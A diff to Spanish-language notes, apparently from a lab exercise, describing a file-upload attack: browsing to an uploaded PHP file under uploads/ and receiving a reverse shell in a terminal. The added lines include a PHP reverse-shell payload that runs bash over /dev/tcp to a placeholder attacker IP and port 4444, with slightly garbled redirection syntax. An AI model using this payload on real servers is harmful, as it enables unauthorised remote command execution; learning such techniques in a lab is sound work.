@@ -23,14 +23,19 @@
 
 ++ Web Browser
 --- Copiar la ruta del archivo php subido
---- Pegar dicha ruta en otra pestaña
+--- Pegar dicha en la misma pestaña siguiendo el formato al final:
+----- uploads/<archivo.php>
 
 ++ Terminal
 --- Se nos mostrará un mensaje de conexión establecida, lo que indica
 que el ataque mediante reverse-shell ha dado exito
+--- Esto nos permite ejecutar comandos tales como: ls, mkdir, etc
 
 
 
 
 ++ Nota, código del shell reverso (archivo php):
+<?php 
+exec("/bin/bash -c 'bash -i > & /dev/tcp/<ip_kali>/<4444> o>&1'");
+?>
 
